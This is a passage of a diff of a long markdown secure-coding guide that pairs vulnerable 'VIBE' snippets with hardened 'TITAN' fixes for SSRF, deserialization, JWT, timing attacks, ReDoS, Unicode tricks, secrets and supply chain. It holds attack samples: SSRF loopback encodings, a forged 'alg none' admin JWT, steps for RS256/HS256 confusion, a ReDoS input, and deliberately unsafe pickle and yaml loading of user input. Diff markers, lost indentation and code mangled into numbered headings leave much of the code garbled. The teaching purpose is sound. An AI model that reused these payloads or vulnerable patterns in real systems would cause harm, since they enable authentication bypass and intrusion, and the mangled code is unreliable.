-
 
 ## Private packages should use unique naming 2
 
-
 ## E.g., mycompany-analytics, mycompany-utils 2
 
-
 ## Detection 3
-
 
 ## Audit for public packages matching internal names 2
 
 | npm info mycompany-internal 2>&1 | grep -q "404" | echo "ALERT: Name exists on public npm!" |
 
-
 ## CERTIFICATE CHAIN VALIDATION FAILURES 2
-
 
 ## Incomplete Chain Scar 2
 
 > "Leaf certificate valid. Browser shows HTTPS lock.
 > Mobile app fails: missing intermediate certificate.
 > Server sends only leaf cert. Some clients can't build chain to root."
-
 
 ## TITAN: Full Chain Validation 2
 
@@ -12214,7 +11386,6 @@ context = ssl.create_default_context()
 with socket.create_connection((hostname, port)) as sock:
 with context.wrap_socket(sock, server_hostname=hostname) as ssock:
 
-
 ## Get full chain 2
 
 chain = ssock.getpeercert(binary_form=True)
@@ -12227,13 +11398,11 @@ return {
 "chain_length": len(certs)
         }
 
-
 ## Verify each cert signs the next 2
 
 for i in range(len(certs) - 1):
 cert = x509.load_der_x509_certificate(certs[i], default_backend())
 issuer = x509.load_der_x509_certificate(certs[i + 1], default_backend())
-
 
 ## Verify issuer matches 2
 
@@ -12249,16 +11418,13 @@ return {
 "leaf_subject": certs[0].subject
         }
 
-
 ## CONSTANT-TIME STRING COMPARISON 2
-
 
 ## Timing Attack Exploitation 2
 
 > "strcmp returns on first mismatch. Fast = wrong first byte.
 > Attacker times 256 requests per byte position.
 > Fastest response = correct byte. HMAC leaked byte-by-byte."
-
 
 ## TITAN: Constant-Time Comparison 3
 
@@ -12271,9 +11437,7 @@ Compare two byte strings in constant time.
 Uses HMAC to prevent timing attacks.
     """
 
-
 ## Method 1: Double HMAC (paranoid) 2
-
 
 ## Random key prevents length-extension attacks 2
 
@@ -12288,22 +11452,17 @@ def verify_api_key(provided: str, stored_hash: str) -> bool:
 Verify API key without timing leakage.
     """
 
-
 ## Hash the provided key first (prevents length leakage) 2
 
 provided_hash = hashlib.sha256(provided.encode()).hexdigest()
-
 
 ## Constant-time comparison of hashes 2
 
 return secrets.compare_digest(provided_hash, stored_hash)
 
-
 ## END OF VOLUME 1.5: TITAN SUPPLY CHAIN & IDENTITY ATTACKS 2
 
-
 ## VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS 2
-
 
 ## OAUTH 2.0: PKCE MANDATORY 2
 
@@ -12314,7 +11473,6 @@ return secrets.compare_digest(provided_hash, stored_hash)
 > Attacker exchanges code for token.
 > PKCE: Code Verifier proves you initiated the request."
 
-
 ## TITAN: PKCE Implementation 2
 
 import secrets
@@ -12324,7 +11482,6 @@ import base64
 class PKCEClient:
 def generate_verifier(self):
 
-
 ## 43-128 chars, cryptographically random 2
 
 self.verifier = base64.urlsafe_b64encode(
@@ -12333,7 +11490,6 @@ self.verifier = base64.urlsafe_b64encode(
 return self.verifier
 
 def generate_challenge(self):
-
 
 ## S256: SHA256 hash of verifier, base64url encoded 2
 
@@ -12358,7 +11514,6 @@ return f"{auth_endpoint}?" + urlencode(params)
 
 def exchange_code(self, token_endpoint, code, client_id, redirect_uri):
 
-
 ## Include verifier in token request 2
 
 response = requests.post(token_endpoint, data={
@@ -12370,9 +11525,7 @@ response = requests.post(token_endpoint, data={
         })
 return response.json()
 
-
 ## SSRF BYPASS TECHNIQUES 2
-
 
 ## IP Address Bypass Scar 2
 
@@ -12380,7 +11533,6 @@ return response.json()
 > Attacker uses: 0177.0.0.1 (octal), 2130706433 (decimal), 0x7f.0.0.1 (hex).
 > Or: DNS rebinding - first request resolves external, second resolves internal.
 > Defense in depth: Block at network level + resolve before fetch."
-
 
 ## TITAN: Comprehensive SSRF Protection 2
 
@@ -12409,7 +11561,6 @@ hostname = parsed.hostname
 if not hostname:
 return False
 
-
 ## Block file:// and other dangerous schemes 2
 
 if parsed.scheme not in ('http', 'https'):
@@ -12417,19 +11568,16 @@ return False
 
         try:
 
-
 ## Resolve BEFORE making request (prevents DNS rebinding) 2
 
 ip_str = socket.gethostbyname(hostname)
 ip = ipaddress.ip_address(ip_str)
-
 
 ## Check against blocklist 2
 
 for network in BLOCKED_NETWORKS:
 if ip in network:
 return False
-
 
 ## Cache DNS result to prevent rebinding between check and use 2
 
@@ -12443,7 +11591,6 @@ def fetch(self, url):
 if not self.is_safe_url(url):
 raise SSRFError(f"Blocked URL: {url}")
 
-
 ## Use cached IP to prevent DNS rebinding 2
 
 parsed = urlparse(url)
@@ -12454,9 +11601,7 @@ self.dns_cache.get(parsed.hostname, parsed.hostname)
 
 return requests.get(safe_url, timeout=5)
 
-
 ## DESERIALIZATION ATTACKS 2
-
 
 ## Object Injection Deep Dive 2
 
@@ -12465,29 +11610,24 @@ return requests.get(safe_url, timeout=5)
 > Java: Gadget chains in classpath = RCE.
 > Rule: Never deserialize untrusted data."
 
-
 ## VIBE: Arbitrary code execution 2
 
 import pickle
 data = request.get_json()['data']
 obj = pickle.loads(base64.b64decode(data))  # RCE!
 
-
 ## VIBE: YAML load is unsafe 2
 
 import yaml
 config = yaml.load(user_input)  # RCE via !!python/object
 
-
 ## TITAN: Safe alternatives 2
 
 import json
 
-
 ## JSON is safe (no code execution) 2
 
 obj = json.loads(user_input)
-
 
 ## If schema needed, use explicit parsing 2
 
@@ -12499,31 +11639,25 @@ age: int
 
 validated = UserInput.parse_raw(user_input)
 
-
 ## If you MUST deserialize complex objects 2
 
 import jsonpickle
 jsonpickle.set_decoder_options('json', cls=SafeDecoder)
 
-
 ## Plus: Whitelist of allowed classes 2
-
 
 ## TITAN: Safe YAML 2
 
 import yaml
 
-
 ## Always use safe_load 2
 
 config = yaml.safe_load(user_input)
-
 
 ## For custom objects, be explicit 2
 
 class SafeLoader(yaml.SafeLoader):
         pass
-
 
 ## Only allow specific types 2
 
@@ -12535,9 +11669,7 @@ SafeLoader.yaml_constructors = {
 
 config = yaml.load(user_input, Loader=SafeLoader)
 
-
 ## CSP BYPASS TECHNIQUES 2
-
 
 ## Content Security Policy Evasion 2
 
@@ -12562,7 +11694,6 @@ form-action 'self';">
 <script nonce="R4nd0mN0nc3">
 // Legitimate code
     </script>
-
 
 ## TITAN: Server-side nonce generation 2
 
@@ -12590,9 +11721,7 @@ f"frame-ancestors 'none'; "
 response.headers['Content-Security-Policy'] = csp
 return response
 
-
 ## RACE CONDITION VULNERABILITIES 2
-
 
 ## Time-of-Check to Time-of-Use (TOCTOU) 2
 
@@ -12601,17 +11730,14 @@ return response
 > Race window: Between read and write.
 > Fix: Atomic operations or database-level locking."
 
-
 ## VIBE: Race condition vulnerable 2
 
 async def transfer(from_account, to_account, amount):
-
 
 ## Check 2
 
 balance = await db.get_balance(from_account)
 if balance >= amount:  # Race window starts
-
 
 ## Time 2
 
@@ -12620,12 +11746,10 @@ await db.update_balance(to_account, amount)  # Race window ends
 return True
 return False
 
-
 ## TITAN: Atomic operation with row locking 2
 
 async def transfer(from_account, to_account, amount):
 async with db.transaction():
-
 
 ## SELECT FOR UPDATE locks the row 2
 
@@ -12645,7 +11769,6 @@ SET balance = balance + $1
 WHERE id = $2
 """, amount, to_account)
 
-
 ## TITAN: Optimistic locking with version 2
 
 async def update_with_cas(id, expected_version, new_data):
@@ -12658,12 +11781,9 @@ WHERE id = $2 AND version = $3
 if result.rowcount == 0:
 raise ConcurrentModificationError("Retry required")
 
-
 ## END OF VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS 2
 
-
 ## VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS 2
-
 
 ## JWT NONE ALGORITHM ATTACK 2
 
@@ -12673,34 +11793,26 @@ raise ConcurrentModificationError("Retry required")
 > Attacker forges token without signature. Backend trusts it.
 > Full authentication bypass. All users compromised."
 
-
 ## VIBE: Accepts any algorithm 2
 
 import jwt
 
 def verify_token(token):
 
-
 ## VULNERABLE: algorithms not specified! 2
 
 payload = jwt.decode(token, secret_key)  # Accepts 'none'!
 return payload
 
-
 ## Attacker creates 2
-
 
 ## Header: {"alg": "none", "typ": "JWT"} 2
 
-
 ## Payload: {"sub": "admin", "role": "superuser"} 2
-
 
 ## Signature: (empty) 2
 
-
 ## Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ 2
-
 
 ## TITAN: Explicit algorithm whitelist 2
 
@@ -12725,21 +11837,15 @@ return payload
 except jwt.InvalidTokenError as e:
 raise AuthenticationError(f"Invalid token: {e}")
 
-
 ## TITAN: Prevent algorithm confusion (RS256 vs HS256) 2
-
 
 ## If using RS256 (asymmetric), attacker might 2
 
-
 ## 1. Get public key (often exposed) 2
-
 
 ## 2. Sign token with HS256 using public key as secret 2
 
-
 ## 3. Server verifies with same "secret" = valid signature! 2
-
 
 ## Defense: NEVER use same key handling for both 2
 
@@ -12748,7 +11854,6 @@ header = jwt.get_unverified_header(token)
 
 if header['alg'] not in ALLOWED_ALGORITHMS:
 raise AuthenticationError(f"Algorithm not allowed: {header['alg']}")
-
 
 ## Use correct key based on algorithm 2
 
@@ -12759,9 +11864,7 @@ key = HMAC_SECRET
 
 return jwt.decode(token, key, algorithms=[header['alg']])
 
-
 ## TIMING ATTACKS AGAINST STRING COMPARISON 2
-
 
 ## The Scar 7
 
@@ -12770,21 +11873,16 @@ return jwt.decode(token, key, algorithms=[header['alg']])
 > Correct prefix = slightly longer response time.
 > Extract full API key one character at a time."
 
-
 ## VIBE: Timing-vulnerable comparison 2
 
 def verify_api_key(provided_key, stored_key):
 return provided_key == stored_key  # VULNERABLE!
 
-
 ## First character mismatch: ~100ns 2
-
 
 ## Last character mismatch: ~1000ns 2
 
-
 ## Attacker can detect the difference! 2
-
 
 ## VIBE: Early return on mismatch 2
 
@@ -12796,7 +11894,6 @@ if provided[i] != stored[i]:
 return False  # Returns early = timing leak!
 return True
 
-
 ## TITAN: Constant-time comparison 4
 
 import hmac
@@ -12804,9 +11901,7 @@ import secrets
 
 def verify_api_key(provided_key: str, stored_key: str) -> bool:
 
-
 ## hmac.compare_digest is constant-time 2
-
 
 ## Takes same time regardless of where mismatch occurs 2
 
@@ -12815,66 +11910,47 @@ return hmac.compare_digest(
         stored_key.encode('utf-8')
     )
 
-
 ## TITAN: For hashed passwords, use dedicated library 2
 
 from passlib.hash import argon2
 
 def verify_password(provided: str, hashed: str) -> bool:
 
-
 ## argon2.verify is constant-time internally 2
 
 return argon2.verify(provided, hashed)
 
-
 ## TITAN: Node.js constant-time comparison 2
-
 
 ## const crypto = require('crypto'); 2
 
-
 ## 4
-
 
 ## function verifyApiKey(provided, stored) { 2
 
-
 ## // crypto.timingSafeEqual is constant-time 2
-
 
 ## const a = Buffer.from(provided); 2
 
-
 ## const b = Buffer.from(stored); 2
-
 
 ## 5
 
-
 ## if (a.length !== b.length) { 2
-
 
 ## // Still compare to prevent length oracle 2
 
-
 ## return crypto.timingSafeEqual(a, a) && false; 2
-
 
 ## } 3
 
-
 ## 6
-
 
 ## return crypto.timingSafeEqual(a, b); 2
 
-
 ## } 4
 
-
 ## REDOS - REGEX DENIAL OF SERVICE 2
-
 
 ## The Scar 8
 
@@ -12883,11 +11959,9 @@ return argon2.verify(provided, hashed)
 > Regex engine backtracks 2^28 times. Server hangs.
 > CPU 100% for minutes on single request."
 
-
 ## VIBE: Catastrophic backtracking patterns 2
 
 import re
-
 
 ## These regexes have exponential backtracking 2
 
@@ -12897,30 +11971,23 @@ BAD_HTML = r'<.*>.*</.*>'  # Greedy with overlap
 
 def validate_email(email):
 
-
 ## With input: 'a' *30 + '!' 2
-
 
 ## Takes MINUTES to return False 2
 
 return re.match(BAD_EMAIL + r'example\.com$', email)
 
-
 ## TITAN: Safe regex patterns 2
 
 import re
 
-
 ## Use possessive quantifiers or atomic groups (not in Python re) 2
 
-
 ## Or rewrite to avoid nested quantifiers 2
-
 
 ## Safe email validation (no nested quantifiers) 2
 
 SAFE_EMAIL = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
-
 
 ## TITAN: Use regex with timeouts 2
 
@@ -12942,21 +12009,17 @@ return None
         finally:
         signal.alarm(0)
 
-
 ## TITAN: Use linear-time regex engine 2
 
 import google_re2 as re2  # Google RE2 guarantees linear time
 
 def validate_input(pattern, text):
 
-
 ## RE2 uses finite automata, no backtracking 2
-
 
 ## Guaranteed O(n) time complexity 2
 
 return re2.match(pattern, text)
-
 
 ## TITAN: Pre-validate input length 2
 
@@ -12967,9 +12030,7 @@ if len(text) > MAX_INPUT_LENGTH:
 raise ValueError("Input too long")
 return re.match(pattern, text)
 
-
 ## UNICODE NORMALIZATION ATTACKS 2
-
 
 ## The Scar 9
 
@@ -12978,24 +12039,19 @@ return re.match(pattern, text)
 > Or: File path with %c0%ae%c0%ae becomes '..' after normalization.
 > Directory traversal bypasses security filter."
 
-
 ## VIBE: Filter before normalization 2
 
 def check_username(username):
 if username.lower() == 'admin':
 raise ValueError("Reserved username")
 
-
 ## Save to database (which normalizes Unicode) 2
 
 return username
 
-
 ## Attacker passes: (circled letters) 2
 
-
 ## Filter passes. Database normalizes to 'admin' 2
-
 
 ## TITAN: Normalize BEFORE checking 2
 
@@ -13003,24 +12059,19 @@ import unicodedata
 
 def sanitize_username(username: str) -> str:
 
-
 ## Normalize to NFKC (compatibility composition) 2
-
 
 ## Converts l, a, III, etc. 2
 
 normalized = unicodedata.normalize('NFKC', username)
 
-
 ## Remove zero-width characters (invisible) 2
-
 
 ## U+200B (zero-width space), U+200C (ZWNJ), U+200D (ZWJ), U+FEFF (BOM) 2
 
 invisible_chars = ['\u200b', '\u200c', '\u200d', '\ufeff', '\u00ad']
 for char in invisible_chars:
 normalized = normalized.replace(char, '')
-
 
 ## Now check against reserved names 2
 
@@ -13029,38 +12080,30 @@ raise ValueError("Reserved username")
 
 return normalized
 
-
 ## TITAN: Confusable character detection 2
 
 from confusables import is_confusable, normalize
 
 def check_homograph(input_str, protected_str):
 
-
 ## Detect visually similar characters 2
-
 
 ## (Cyrillic vs 'paypal.com' (Latin 'a') 2
 
 return is_confusable(input_str, protected_str)
 
-
 ## TITAN: Locale-aware case conversion (Turkish problem) 2
 
 def safe_lowercase(text: str, locale: str = 'en') -> str:
 
-
 ## Turkish: 'I'.lower() should be (dotless i), not 'i' 2
-
 
 ## Don't use .lower() for security comparisons! 2
 
 import icu  # PyICU
 return icu.UnicodeString(text).toLower(icu.Locale(locale))
 
-
 ## BUFFER OVERFLOW PREVENTION PATTERNS 2
-
 
 ## The Scar 10
 
@@ -13083,7 +12126,6 @@ buffer[i] = input[i];
 }
 
 // TITAN: Bounded string operations
-
 
 ## include <string.h> 2
 
@@ -13109,12 +12151,9 @@ buffer[sizeof(buffer) - 1] = '\0';  // Ensure null termination
 // buffer
 // }
 
-
 ## END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS 2
 
-
 ## VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION 2
-
 
 ## JWT SECURITY PITFALLS 2
 
@@ -13242,7 +12281,6 @@ refreshToken: this.createRefreshToken(decoded.sub),
     }
 }
 
-
 ## SECRETS MANAGEMENT WITH VAULT 2
 
 ### The Scar 7
@@ -13252,7 +12290,6 @@ refreshToken: this.createRefreshToken(decoded.sub),
 > AWS keys exposed. $50k bill overnight.
 > Crypto miners spun up hundreds of instances."
 
-
 ## VIBE: Hardcoded secrets 2
 
 import os
@@ -13260,11 +12297,9 @@ import os
 AWS_KEY = "AKIAIOSFODNN7EXAMPLE"  # Hardcoded!
 AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  # Hardcoded!
 
-
 ## Or slightly better but still dangerous 2
 
 AWS_KEY = os.getenv("AWS_KEY")  # In .env, might get committed
-
 
 ## TITAN: HashiCorp Vault integration 2
 
@@ -13281,7 +12316,6 @@ self.client = hvac.Client(url=vault_addr)
 self.auth_method = auth_method
 self.lease_cache: dict[str, tuple[dict, datetime]] = {}
 
-
 ## Authenticate based on environment 2
 
         self._authenticate()
@@ -13290,7 +12324,6 @@ def _authenticate(self):
 """Authenticate to Vault using appropriate method."""
 
 if self.auth_method == 'kubernetes':
-
 
 ## Read service account token 2
 
@@ -13304,7 +12337,6 @@ jwt = f.read()
 
 elif self.auth_method == 'aws':
 
-
 ## IAM authentication 2
 
         self.client.auth.aws.iam_login(
@@ -13313,7 +12345,6 @@ elif self.auth_method == 'aws':
         )
 
 elif self.auth_method == 'approle':
-
 
 ## For CI/CD 2
 
@@ -13326,7 +12357,6 @@ import os
 def get_secret(self, path: str, key: str) -> str:
 """Get a secret value with caching and lease management."""
 
-
 ## Check cache 2
 
 cache_key = f"{path}:{key}"
@@ -13334,7 +12364,6 @@ if cache_key in self.lease_cache:
 secret, expires_at = self.lease_cache[cache_key]
 if datetime.now() < expires_at:
 return secret[key]
-
 
 ## Fetch from Vault 2
 
@@ -13344,7 +12373,6 @@ response = self.client.secrets.kv.v2.read_secret_version(
         )
 
 secret = response['data']['data']
-
 
 ## Cache with lease 2
 
@@ -13365,7 +12393,6 @@ response = self.client.secrets.database.generate_credentials(
 username = response['data']['username']
 password = response['data']['password']
 
-
 ## Log for audit 2
 
 logging.info(f"Generated dynamic DB creds for role {role}, lease_id: {response['lease_id']}")
@@ -13375,16 +12402,13 @@ return username, password
 def rotate_api_key(self, key_name: str) -> str:
 """Rotate an API key with zero downtime."""
 
-
 ## 1. Generate new key 2
 
 new_key = secrets.token_urlsafe(32)
 
-
 ## 2. Read current key 2
 
 current = self.get_secret(f'api-keys/{key_name}', 'current')
-
 
 ## 3. Update Vault with both keys active 2
 
@@ -13400,7 +12424,6 @@ current = self.get_secret(f'api-keys/{key_name}', 'current')
 
 return new_key
 
-
 ## Usage 2
 
 vault = VaultSecretManager(
@@ -13408,19 +12431,15 @@ vault = VaultSecretManager(
         auth_method='kubernetes'
     )
 
-
 ## Get static secret 2
 
 api_key = vault.get_secret('myapp/config', 'stripe_api_key')
-
 
 ## Get dynamic database credentials 2
 
 db_user, db_pass = vault.get_dynamic_database_credentials('myapp-readonly')
 
-
 ## API KEY ROTATION 2
-
 
 ## The Scar 11
 
@@ -13428,7 +12447,6 @@ db_user, db_pass = vault.get_dynamic_database_credentials('myapp-readonly')
 > Employee left, still had the key.
 > Used it from competitor company.
 > No audit trail. Couldn't prove breach source."
-
 
 ## VIBE: Static API keys 2
 
@@ -13439,7 +12457,6 @@ def get_data(api_key: str = Header()):
 if api_key != API_KEY:
 raise HTTPException(401)
 return {"data": "secret"}
-
 
 ## TITAN: Rotating API keys with audit trail 2
 
@@ -13464,13 +12481,11 @@ expires_in_days: int = 365
 ) -> tuple[str, str]:
 """Create new API key. Returns (key_id, secret) - secret shown only once!"""
 
-
 ## Generate key components 2
 
 key_id = f"sk_{secrets.token_urlsafe(8)}"
 key_secret = secrets.token_urlsafe(32)
 key_hash = self._hash_key(key_secret)
-
 
 ## Store in database (NEVER store the secret!) 2
 
@@ -13488,11 +12503,9 @@ await self.db.api_keys.create(
         }
         )
 
-
 ## Audit log 2
 
 await self._audit_log(user_id, 'API_KEY_CREATED', {'key_id': key_id, 'name': name})
-
 
 ## Return full key (only time it's visible) 2
 
@@ -13507,7 +12520,6 @@ key_id, key_secret = full_key.split('.', 1)
 except ValueError:
 return None
 
-
 ## Check cache first 2
 
 cache_key = f"apikey:{key_id}"
@@ -13516,7 +12528,6 @@ cached = await self.redis.get(cache_key)
 if cached:
 key_data = json.loads(cached)
         else:
-
 
 ## Fetch from database 2
 
@@ -13527,11 +12538,9 @@ where={'id': key_id}
 if not key_data:
 return None
 
-
 ## Cache for 5 minutes 2
 
 await self.redis.setex(cache_key, 300, json.dumps(key_data))
-
 
 ## Verify hash 2
 
@@ -13539,19 +12548,16 @@ if not self._verify_key(key_secret, key_data['key_hash']):
 await self._audit_log(None, 'API_KEY_INVALID_SECRET', {'key_id': key_id})
 return None
 
-
 ## Check expiration 2
 
 if datetime.fromisoformat(key_data['expires_at']) < datetime.utcnow():
 await self._audit_log(key_data['user_id'], 'API_KEY_EXPIRED', {'key_id': key_id})
 return None
 
-
 ## Check if revoked 2
 
 if key_data.get('revoked_at'):
 return None
-
 
 ## Update last used (async, don't block request) 2
 
@@ -13571,7 +12577,6 @@ old_key = await self.db.api_keys.find_unique(where={'id': key_id})
 if not old_key:
 raise ValueError("Key not found")
 
-
 ## Create new key 2
 
 new_key_id, new_full_key = await self.create_api_key(
@@ -13579,7 +12584,6 @@ new_key_id, new_full_key = await self.create_api_key(
 name=f"{old_key['name']} (rotated)",
         permissions=old_key['permissions']
         )
-
 
 ## Mark old key for deprecation (still valid for 24 hours) 2
 
@@ -13590,7 +12594,6 @@ where={'id': key_id},
 'expires_at': datetime.utcnow() + timedelta(hours=24)
         }
         )
-
 
 ## Invalidate cache 2
 
@@ -13620,12 +12623,9 @@ return secrets.compare_digest(
         stored_hash
         )
 
-
 ## VOLUME 7: PRODUCTION DATABASE OPERATIONS
 
-
 ## VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY 2
-
 
 ## DEPENDENCY VULNERABILITY DISASTERS 2
 
@@ -13636,12 +12636,9 @@ return secrets.compare_digest(
 > No SBOM. No dependency graph. Manual audit.
 > Took 2 weeks to find and patch everywhere."
 
-
 ## VIBE: No dependency scanning 2
 
-
 ## Just run npm install and hope nothing bad happens 2
-
 
 ## TITAN: GitHub Actions with dependency scanning and SBOM 2
 
@@ -13662,7 +12659,6 @@ runs-on: ubuntu-latest
 
 - uses: actions/checkout@v4
 
-
 ## Generate SBOM (Software Bill of Materials) 2
 
 - name: Generate SBOM
@@ -13672,7 +12668,6 @@ uses: anchore/sbom-action@v0
 path: .
 format: spdx-json
 output-file: sbom.spdx.json
-
 
 ## Scan for vulnerabilities 2
 
@@ -13684,7 +12679,6 @@ sbom: sbom.spdx.json
 fail-build: true
 severity-cutoff: high
 
-
 ## Check for known malicious packages 2
 
 - name: Malware Scan
@@ -13695,7 +12689,6 @@ npx lockfile-lint --path package-lock.json \
 --validate-package-names \
         --validate-checksum
 
-
 ## Upload SBOM as artifact 2
 
 - uses: actions/upload-artifact@v3
@@ -13703,7 +12696,6 @@ npx lockfile-lint --path package-lock.json \
         with:
 name: sbom
 path: sbom.spdx.json
-
 
 ## Attest SBOM for provenance 2
 
@@ -13723,7 +12715,6 @@ runs-on: ubuntu-latest
 
 run: docker build -t myapp:${{ github.sha }} .
 
-
 ## Scan container image 2
 
 - name: Trivy container scan
@@ -13736,14 +12727,12 @@ output: trivy-results.sarif
 severity: 'CRITICAL,HIGH'
 exit-code: 1
 
-
 ## Upload scan results 2
 
 - uses: github/codeql-action/upload-sarif@v2
 
         with:
 sarif_file: trivy-results.sarif
-
 
 ## TITAN: Continuous dependency monitoring 2
 
@@ -13771,7 +12760,6 @@ async def scan_monorepo(self, repo_path: str) -> list[VulnerabilityAlert]:
 """Scan all services in monorepo for vulnerabilities."""
 alerts = []
 
-
 ## Find all package.json files 2
 
 result = subprocess.run(
@@ -13783,7 +12771,6 @@ package_files = result.stdout.strip().split('\n')
 
 for pkg_file in package_files:
 service_name = pkg_file.split('/')[-2]
-
 
 ## Run npm audit 2
 
@@ -13806,7 +12793,6 @@ cve_id=vuln_info.get('via', [{}])[0].get('cve', 'N/A'),
 fixed_version=vuln_info.get('fixAvailable', {}).get('version'),
         affected_services=[service_name]
         )
-
 
 ## Deduplicate 2
 
@@ -13859,9 +12845,7 @@ f"Fix: Upgrade to `{alert.fixed_version}`"
 
 await self._send_slack(message)
 
-
 ## CONTAINER IMAGE SIGNING 2
-
 
 ## The Scar 12
 
@@ -13870,14 +12854,12 @@ await self._send_slack(message)
 > No signature verification. Running attacker's code.
 > Detected 3 weeks later during security audit."
 
-
 ## VIBE: Pull any image, trust registry 2
 
 spec:
   containers:
 
 - image: registry.io/app:latest  # Anyone could have pushed this
-
 
 ## TITAN: Cosign image signing and verification 2
 
@@ -13914,7 +12896,6 @@ uses: docker/build-push-action@v5
 push: true
 tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
 
-
 ## Sign with keyless signing (Sigstore) 2
 
 - name: Sign Image
@@ -13924,7 +12905,6 @@ COSIGN_EXPERIMENTAL: 1
 | run: |
 cosign sign --yes \
 ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
-
 
 ## Attest SBOM 2
 
@@ -13936,9 +12916,7 @@ cosign attest --yes \
 --type spdxjson \
 ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
 
-
 ## TITAN: Kubernetes admission controller for signature verification 2
-
 
 ## Kyverno policy 2
 
@@ -13988,9 +12966,7 @@ url: <<<<<https://rekor.sigstore.dev>>>>>
 operator: GreaterThan
 value: "2024-01-01T00:00:00Z"
 
-
 ## VOLUME 8: DATABASE REPLICATION PATTERNS
-
 
 ## Table of Contents
 
@@ -14041,7 +13017,7 @@ value: "2024-01-01T00:00:00Z"
 - [Configuration](#configuration)
   - [Express](#express)
   - [Headers Explained](#headers-explained)
-- [Common Issues](#common-issues-1)
+- [Common Issues](#common-issues-2)
 - [?? ENCRYPTION PATTERNS](#-encryption-patterns)
 - [Encryption Types](#encryption-types)
 - [Hashing vs Encryption](#hashing-vs-encryption)
@@ -14051,8 +13027,8 @@ value: "2024-01-01T00:00:00Z"
 - [?? API SECURITY CHECKLIST](#-api-security-checklist)
 - [Authentication](#authentication)
 - [Authorization](#authorization)
-- [Input Validation](#input-validation-1)
-- [Rate Limiting](#rate-limiting-1)
+- [Input Validation](#input-validation-4)
+- [Rate Limiting](#rate-limiting)
 - [Headers](#headers)
 - [Logging](#logging)
 - [?? ZERO TRUST SECURITY](#-zero-trust-security)
@@ -14103,7 +13079,7 @@ value: "2024-01-01T00:00:00Z"
 - [Context-Specific Encoding](#context-specific-encoding)
 - [CSP as Defense in Depth](#csp-as-defense-in-depth)
 - [?? SECURE HEADERS CONFIGURATION](#-secure-headers-configuration)
-- [Essential Headers](#essential-headers-1)
+- [Essential Headers](#essential-headers-2)
 - [Header Reference](#header-reference)
 - [Verification](#verification)
 - [07_SECURITY.MD: THE TITAN GUIDE (25K TARGET)](#07_securitymd-the-titan-guide-25k-target)
@@ -14114,32 +13090,32 @@ value: "2024-01-01T00:00:00Z"
   - [**VOLUME 4: THE EXPERT (The "Scale")**](#volume-4-the-expert-the-scale)
   - [**VOLUME 5: THE TITAN (The "Kernel")**](#volume-5-the-titan-the-kernel)
   - [**VOLUME 6: THE INFINITE (The "Future")**](#volume-6-the-infinite-the-future)
-- [VOLUME 1: THE SCARS (THE "WHY")](#volume-1-the-scars-the-why-1)
+- [VOLUME 1: THE SCARS (THE "WHY")](#volume-1-the-scars-the-why)
   - [1. THE "LOG4SHELL" (CVE-2021-44228)](#1-the-log4shell-cve-2021-44228)
     - [The Internet on Fire](#the-internet-on-fire)
   - [4. THE "CAPITAL ONE BREACH"](#4-the-capital-one-breach)
     - [SSRF (Server Side Request Forgery)](#ssrf-server-side-request-forgery)
-- [VOLUME 2: THE FOUNDATION (THE "WHAT")](#volume-2-the-foundation-the-what-1)
+- [VOLUME 2: THE FOUNDATION (THE "WHAT")](#volume-2-the-foundation-the-what)
   - [5. ZERO TRUST ARCHITECTURE](#5-zero-trust-architecture)
     - [Never Trust, Always Verify](#never-trust-always-verify)
   - [6. OAUTH2 & OIDC](#6-oauth2-oidc)
     - [Authentication Flows Deep Dive](#authentication-flows-deep-dive)
-- [VOLUME 3: THE DEEP DIVE (THE "HOW")](#volume-3-the-deep-dive-the-how-1)
+- [VOLUME 3: THE DEEP DIVE (THE "HOW")](#volume-3-the-deep-dive-the-how)
   - [9. JWT SECURITY](#9-jwt-security)
     - [Signing & Revocation](#signing-revocation)
   - [10. WAF (WEB APPLICATION FIREWALL)](#10-waf-web-application-firewall)
     - [Rules & Bypass](#rules-bypass)
-- [VOLUME 4: THE EXPERT (THE "SCALE")](#volume-4-the-expert-the-scale-1)
+- [VOLUME 4: THE EXPERT (THE "SCALE")](#volume-4-the-expert-the-scale)
   - [13. SECRET MANAGEMENT](#13-secret-management)
     - [Vault & AWS Secrets Manager](#vault-aws-secrets-manager)
   - [14. CONTAINER SECURITY](#14-container-security)
     - [Distroless & Runtime Security](#distroless-runtime-security)
-- [VOLUME 5: THE TITAN (THE "KERNEL")](#volume-5-the-titan-the-kernel-1)
+- [VOLUME 5: THE TITAN (THE "KERNEL")](#volume-5-the-titan-the-kernel-2)
   - [16. MEMORY SAFETY](#16-memory-safety)
     - [Rust vs C++](#rust-vs-c)
   - [18. HOMOMORPHIC ENCRYPTION](#18-homomorphic-encryption)
     - [Compute on Encrypted Data](#compute-on-encrypted-data)
-- [VOLUME 6: THE INFINITE (THE "FUTURE")](#volume-6-the-infinite-the-future-1)
+- [VOLUME 6: THE INFINITE (THE "FUTURE")](#volume-6-the-infinite-the-future-2)
   - [19. QUANTUM-SAFE CRYPTOGRAPHY](#19-quantum-safe-cryptography)
     - [Post-Quantum Algorithms](#post-quantum-algorithms)
 - [VOLUME 7: THE APPENDIX (TITAN REFERENCE)](#volume-7-the-appendix-titan-reference)
@@ -14189,9 +13165,9 @@ value: "2024-01-01T00:00:00Z"
   - [Threat Intelligence](#threat-intelligence)
     - [END OF MEGA SECURITY EXPANSION](#end-of-mega-security-expansion)
 - [ACCESS DEEP ATLAS](#access-deep-atlas)
-  - [Each keyword = expandable implementation](#each-keyword-expandable-implementation-1)
+  - [Each keyword = expandable implementation](#each-keyword-expandable-implementation-4)
   - [Authentication](#authentication-2)
-  - [OAuth 2.0 / OIDC](#oauth-20-oidc-1)
+  - [OAuth 2.0 / OIDC](#oauth-20-oidc-2)
   - [Identity Providers](#identity-providers)
